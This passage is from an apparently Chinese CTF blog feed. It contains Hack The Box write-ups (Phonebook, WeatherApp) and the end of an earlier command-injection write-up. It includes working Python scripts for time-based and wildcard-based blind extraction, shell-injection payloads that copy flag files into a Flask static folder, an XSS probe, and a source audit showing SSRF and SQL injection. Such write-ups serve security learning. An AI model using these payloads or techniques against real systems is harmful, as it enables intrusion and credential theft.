4;fi&#x27;&#x27;&#x27;</span><br>        r = requests.post(url,data=&#123;<br>            <span class="hljs-string">&#x27;hostname&#x27;</span>:payload<br>        &#125;)<br>        e_time = time.time()<br>        exec_time = e_time - s_time<br>        <span class="hljs-keyword">if</span> exec_time &gt; <span class="hljs-number">4</span>:<br>            flag += j<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>另一种方法：<br>flask的静态目录(static)，是可以直接通过浏览器访问的，所以可以把命令执行的结果写入其中：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">|mkdir static</span><br><span class="hljs-string">|cat flag.txt &gt; flag</span><br></code></pre></td></tr></table></figure><p>在通过浏览器直接访问<code>http://ip/static/flag</code>即可</p><h3 id="fetch"><a href="#fetch" class="headerlink" title="fetch"></a>fetch</h3><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>后续更新ing</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB_note</title>
    <link href="/2023/08/03/HTB-note/"/>
    <url>/2023/08/03/HTB-note/</url>
    
    <content type="html"><![CDATA[<h1 id="Hack-The-Box做题记录"><a href="#Hack-The-Box做题记录" class="headerlink" title="Hack The Box做题记录"></a>Hack The Box做题记录</h1><h3 id="Phonebook"><a href="#Phonebook" class="headerlink" title="Phonebook"></a>Phonebook</h3><p><img src="/2023/08/03/HTB-note/image-20230803180922022.png"></p><p>一个登录界面，下面提示用Reese登录，看到登录框试着SQL注入，但是发现不管什么姿势都没用，再观察，发现输入错误时会请求一个GET参数message，</p><p><img src="/2023/08/03/HTB-note/image-20230803182452389.png"></p><p>可能这里也有漏洞，尝试了下xss，<code>&lt;img src=x onerror=alert(1)&gt;</code></p><p><img src="/2023/08/03/HTB-note/image-20230803182633427.png"></p><p>确实存在xss漏洞，但是经观察，并不能对其利用，那试试模板注入：</p><p>这里不止试了这一种，用tplmap跑了一遍所有的模板引擎的情况，都不行，大概模板注入也是走不通了</p><p><img src="/2023/08/03/HTB-note/image-20230803182757988.png"></p><p>去找hint吧。。看了别人到这的做法，是在密码传入通配符’*’？？未曾设想的道路。</p><p>然后跳转到这样一个页面，在搜索框里随便输入一个1，显示出挺多的，</p><p><img src="/2023/08/03/HTB-note/image-20230803184308396.png"></p><p>在搜索框也是一顿暴锤，按刚刚的姿势把<code>*</code>输入返回无搜索结果，然后发现<code>*</code>后面随便输一个字符发现居然蹦出好多，</p><p><img src="/image-20230803185410362.png" alt="image-20230803185410362"></p><p>那。。推测不就是正则表达式了吗？理解了题意之后去&#x2F;login页面，传入：</p><p><img src="/2023/08/03/HTB-note/image-20230803205625894.png"></p><p>发生了跳转，*代表匹配前面的字符任意次(<strong>零次</strong>或多次)，如<code>ab*</code>表示匹配a后面跟着任意个连续的b，可匹配a,ab,abb等，<code>a*b</code>可匹配任意个连续的a开头，后面跟一个b，可匹配b,ab,aab等，<code>a*b*c</code>匹配任意个连续的a开头，后跟任意个连续的b，最后以一个c结尾，如c,ac,bc,abc,aabc,abbc,aaabbc等</p><p><code>&#39;.&#39;</code>(点号)：匹配任意单个字符，除换行符。eg：<code>a.b</code>可匹配aab,axb,a@b等</p><p><code>.*</code>就形成了贪婪匹配，匹配以a开头，后跟任意个字符，最后以b结尾，如axyzb，a@qqb等</p><p><code>&#39;?&#39;</code>(问号)：表示匹配前面的字符0次或1次，如ab?可匹配ab或a</p><p><code>+</code>(加号)：表示匹配前面的字符<strong>一次</strong>或多次</p><p><code>&#123;n&#125;</code>：表示匹配前面的字符恰好n次，如a{3}表示匹配恰好三个连续的a字符</p><p><code>&#123;n,&#125;</code>：表示匹配前面的字符至少n次，如，a{2,}可匹配aabcd,aaabcd等</p><p><code>&#123;n,m&#125;</code>：表示匹配前面的字符至少n次，最多m次</p><p><code>[]</code>：表示字符类，匹配其中的任意一个字符，如[abc]可匹配a,b或c</p><p><code>[^]</code>：表示否定字符类，匹配除了其中字符外的任意字符</p><p>这里我们根据*匹配前面的字符任意次，我们编写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>pre = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_&#125;&#123;?!@#$%^&amp;*&lt;&gt;&#x27;</span><br><br>url = <span class="hljs-string">&#x27;http://167.172.61.89:32269/login&#x27;</span><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">60</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> pre:<br>        <span class="hljs-built_in">print</span>(char)<br>        payload = flag + char + <span class="hljs-string">&#x27;*&#x27;</span><br><span class="hljs-comment">#逐步判断H*,HT*,HTB*,HTB&#123;*等等</span><br>        r = requests.post(url,data=&#123;<br>                <span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">&#x27;Reese&#x27;</span>,<br>                <span class="hljs-string">&#x27;password&#x27;</span>:payload<br>        &#125;).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;success&#x27;</span> <span class="hljs-keyword">in</span> r:<br>            flag += char<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="/2023/08/03/HTB-note/image-20230803233340896.png"></p><h3 id="WeatherApp"><a href="#WeatherApp" class="headerlink" title="WeatherApp"></a>WeatherApp</h3><p>打开之后是这样一个页面：</p><p><img src="/2023/08/03/HTB-note/image-20230812185016968.png"></p><p>审计源代码：<br>.&#x2F;index.js：</p><p><img src="/2023/08/03/HTB-note/image-20230812185353082.png"></p><p>.&#x2F;routes&#x2F;index.js：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> path              = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> fs                = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> express           = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> router            = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">WeatherHelper</span>     = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../helpers/WeatherHelper&#x27;</span>);<br><br><span class="hljs-keyword">let</span> db;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">response</span> = data =&gt; (&#123; <span class="hljs-attr">message</span>: data &#125;);<br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">&#x27;views/index.html&#x27;</span>));<br>&#125;);<br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">&#x27;views/register.html&#x27;</span>));<br>&#125;);<br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><br><span class="hljs-keyword">if</span> (req.<span class="hljs-property">socket</span>.<span class="hljs-property">remoteAddress</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^.*:/</span>, <span class="hljs-string">&#x27;&#x27;</span>) != <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">end</span>();<br>&#125;<br><br><span class="hljs-keyword">let</span> &#123; username, password &#125; = req.<span class="hljs-property">body</span>;<br><br><span class="hljs-keyword">if</span> (username &amp;&amp; password) &#123;<br><span class="hljs-keyword">return</span> db.<span class="hljs-title function_">register</span>(username, password)<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function">()  =&gt;</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Successfully registered&#x27;</span>)))<br>.<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Something went wrong&#x27;</span>)));<br>&#125;<br><br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Missing parameters&#x27;</span>));<br>&#125;);<br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">&#x27;views/login.html&#x27;</span>));<br>&#125;);<br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><span class="hljs-keyword">let</span> &#123; username, password &#125; = req.<span class="hljs-property">body</span>;<br><br><span class="hljs-keyword">if</span> (username &amp;&amp; password) &#123;<br><span class="hljs-keyword">return</span> db.<span class="hljs-title function_">isAdmin</span>(username, password)<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">admin</span> =&gt;</span> &#123;<br><span class="hljs-keyword">if</span> (admin) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;/app/flag&#x27;</span>).<span class="hljs-title function_">toString</span>());<br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;You are not admin&#x27;</span>));<br>&#125;)<br>.<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Something went wrong&#x27;</span>)));<br>&#125;<br><br><span class="hljs-keyword">return</span> re.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Missing parameters&#x27;</span>));<br>&#125;);<br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/weather&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><span class="hljs-keyword">let</span> &#123; endpoint, city, country &#125; = req.<span class="hljs-property">body</span>;<br><br><span class="hljs-keyword">if</span> (endpoint &amp;&amp; city &amp;&amp; country) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title class_">WeatherHelper</span>.<span class="hljs-title function_">getWeather</span>(res, endpoint, city, country);<br>&#125;<br><br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Missing parameters&#x27;</span>));<br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-function"><span class="hljs-params">database</span> =&gt;</span> &#123; <br>db = database;<br><span class="hljs-keyword">return</span> router;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><br><span class="hljs-keyword">if</span> (req.<span class="hljs-property">socket</span>.<span class="hljs-property">remoteAddress</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^.*:/</span>, <span class="hljs-string">&#x27;&#x27;</span>) != <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">end</span>();<br>&#125;<br><br><span class="hljs-keyword">let</span> &#123; username, password &#125; = req.<span class="hljs-property">body</span>;<br><br><span class="hljs-keyword">if</span> (username &amp;&amp; password) &#123;<br><span class="hljs-keyword">return</span> db.<span class="hljs-title function_">register</span>(username, password)<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function">()  =&gt;</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Successfully registered&#x27;</span>)))<br>.<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Something went wrong&#x27;</span>)));<br>&#125;<br><br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Missing parameters&#x27;</span>));<br>&#125;);<br></code></pre></td></tr></table></figure><p>从上面我们可以看到&#x2F;register路由的配置，在访问&#x2F;register时需要用户的远程IP为本地回环地址，否则就会返回401状态码，也就是说只有内网才能访问，就很容易想到SSRF利用存在可能性，有看到一个register()方法，追踪去看这个函数，在database.js中，这里<code>register()</code>没有用使用预编译SQL语句，而是直接拼接字符串，存在SQL注入利用的可能性：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">async</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">user, pass</span>) &#123;<br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> add parameterization and roll public</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">async</span> (resolve, reject) =&gt; &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">let</span> query = <span class="hljs-string">`INSERT INTO users (username, password) VALUES (&#x27;<span class="hljs-subst">$&#123;user&#125;</span>&#x27;, &#x27;<span class="hljs-subst">$&#123;pass&#125;</span>&#x27;)`</span>;<br>            <span class="hljs-title function_">resolve</span>((<span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">db</span>.<span class="hljs-title function_">run</span>(query)));<br>        &#125; <span class="hljs-keyword">catch</span>(e) &#123;<br>            <span class="hljs-title function_">reject</span>(e);<br>        &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是&#x2F;login路由，这里就能看到&#x2F;flag的获取渠道了，需要经过<code>isAdmin()</code>方法的验证以admin身份登录。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><span class="hljs-keyword">let</span> &#123; username, password &#125; = req.<span class="hljs-property">body</span>;<br><br><span class="hljs-keyword">if</span> (username &amp;&amp; password) &#123;<br><span class="hljs-keyword">return</span> db.<span class="hljs-title function_">isAdmin</span>(username, password)<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">admin</span> =&gt;</span> &#123;<br><span class="hljs-keyword">if</span> (admin) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;/app/flag&#x27;</span>).<span class="hljs-title function_">toString</span>());<br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;You are not admin&#x27;</span>));<br>&#125;)<br>.<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Something went wrong&#x27;</span>)));<br>&#125;<br><br><span class="hljs-keyword">return</span> re.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Missing parameters&#x27;</span>));<br>&#125;);<br></code></pre></td></tr></table></figure><p>顺着去找<code>isAdmin()</code>方法，在database.js中，这里查询用的预编译：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">async</span> <span class="hljs-title function_">isAdmin</span>(<span class="hljs-params">user, pass</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">async</span> (resolve, reject) =&gt; &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">let</span> smt = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">db</span>.<span class="hljs-title function_">prepare</span>(<span class="hljs-string">&#x27;SELECT username FROM users WHERE username = ? and password = ?&#x27;</span>);<br>            <span class="hljs-keyword">let</span> row = <span class="hljs-keyword">await</span> smt.<span class="hljs-title function_">get</span>(user, pass);<br>            <span class="hljs-title function_">resolve</span>(row !== <span class="hljs-literal">undefined</span> ? row.<span class="hljs-property">username</span> == <span class="hljs-string">&#x27;admin&#x27;</span> : <span class="hljs-literal">false</span>);<br>        &#125; <span class="hljs-keyword">catch</span>(e) &#123;<br>            <span class="hljs-title function_">reject</span>(e);<br>        &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>database.js这里<code>migrate()</code>函数中在创建admin用户时生成了个32位的随机数然后再转16进制再经过加密，爆破是几乎不可能的了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">async</span> <span class="hljs-title function_">migrate</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">db</span>.<span class="hljs-title function_">exec</span>(<span class="hljs-string">`</span><br><span class="hljs-string">        DROP TABLE IF EXISTS users;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        CREATE TABLE IF NOT EXISTS users (</span><br><span class="hljs-string">            id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span><br><span class="hljs-string">            username   VARCHAR(255) NOT NULL UNIQUE,</span><br><span class="hljs-string">            password   VARCHAR(255) NOT NULL</span><br><span class="hljs-string">        );</span><br><span class="hljs-string"></span><br><span class="hljs-string">        INSERT INTO users (username, password) VALUES (&#x27;admin&#x27;, &#x27;<span class="hljs-subst">$&#123; crypto.randomBytes(<span class="hljs-number">32</span>).toString(<span class="hljs-string">&#x27;hex&#x27;</span>) &#125;</span>&#x27;);</span><br><span class="hljs-string">    `</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x2F;api&#x2F;waether，这个路由中，<code>let &#123; endpoint, city, country &#125; = req.body;</code>将POST请求的参数赋给<code>&#123; endpoint, city, country &#125;</code>，调用WeatherHelper中的<code>getWeather()</code>方法，参数为res, endpoint, city, country</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/weather&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><span class="hljs-keyword">let</span> &#123; endpoint, city, country &#125; = req.<span class="hljs-property">body</span>;<br><br><span class="hljs-keyword">if</span> (endpoint &amp;&amp; city &amp;&amp; country) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title class_">WeatherHelper</span>.<span class="hljs-title function_">getWeather</span>(res, endpoint, city, country);<br>&#125;<br><br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Missing parameters&#x27;</span>));<br>&#125;);<br></code></pre></td></tr></table></figure><p>，那就顺着思路往下看WeatherHelper.js，就是请求一个api然后返回城市数据气温等等信息：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">HttpHelper</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../helpers/HttpHelper&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-keyword">async</span> <span class="hljs-title function_">getWeather</span>(<span class="hljs-params">res, endpoint, city, country</span>) &#123;<br><br>        <span class="hljs-comment">// *.openweathermap.org is out of scope</span><br>        <span class="hljs-keyword">let</span> apiKey = <span class="hljs-string">&#x27;10a62430af617a949055a46fa6dec32f&#x27;</span>;<br>        <span class="hljs-keyword">let</span> weatherData = <span class="hljs-keyword">await</span> <span class="hljs-title class_">HttpHelper</span>.<span class="hljs-title class_">HttpGet</span>(<span class="hljs-string">`http://<span class="hljs-subst">$&#123;endpoint&#125;</span>/data/2.5/weather?q=<span class="hljs-subst">$&#123;city&#125;</span>,<span class="hljs-subst">$&#123;country&#125;</span>&amp;units=metric&amp;appid=<span class="hljs-subst">$&#123;apiKey&#125;</span>`</span>); <br>        <br>        <span class="hljs-keyword">if</span> (weatherData.<span class="hljs-property">name</span>) &#123;<br>            <span class="hljs-keyword">let</span> weatherDescription = weatherData.<span class="hljs-property">weather</span>[<span class="hljs-number">0</span>].<span class="hljs-property">description</span>;<br>            <span class="hljs-keyword">let</span> weatherIcon = weatherData.<span class="hljs-property">weather</span>[<span class="hljs-number">0</span>].<span class="hljs-property">icon</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">let</span> weatherTemp = weatherData.<span class="hljs-property">main</span>.<span class="hljs-property">temp</span>;<br><br>            <span class="hljs-keyword">switch</span> (<span class="hljs-built_in">parseInt</span>(weatherIcon)) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                    weatherIcon = <span class="hljs-string">&#x27;icon-clouds&#x27;</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>: <span class="hljs-keyword">case</span> <span class="hljs-number">10</span>:<br>                    weatherIcon = <span class="hljs-string">&#x27;icon-rain&#x27;</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">11</span>:<br>                    weatherIcon = <span class="hljs-string">&#x27;icon-storm&#x27;</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">13</span>:<br>                    weatherIcon = <span class="hljs-string">&#x27;icon-snow&#x27;</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-attr">default</span>:<br>                    weatherIcon = <span class="hljs-string">&#x27;icon-sun&#x27;</span>;<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(&#123;<br>                <span class="hljs-attr">desc</span>: weatherDescription,<br>                <span class="hljs-attr">icon</span>: weatherIcon,<br>                <span class="hljs-attr">temp</span>: weatherTemp,<br>            &#125;);<br>        &#125; <br><br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-attr">error</span>: <span class="hljs-string">`Could not find <span class="hljs-subst">$&#123;city&#125;</span> or <span class="hljs-subst">$&#123;country&#125;</span>`</span><br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中的<code>HttpHelper.HttpGet()</code>方法是访问一个api并接受处理返回的数据，以json返回，重点在于，<strong>这里是通过服务端进行一次get请求的</strong>，并且endpoint等参数在前面看到过，是可控的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br><span 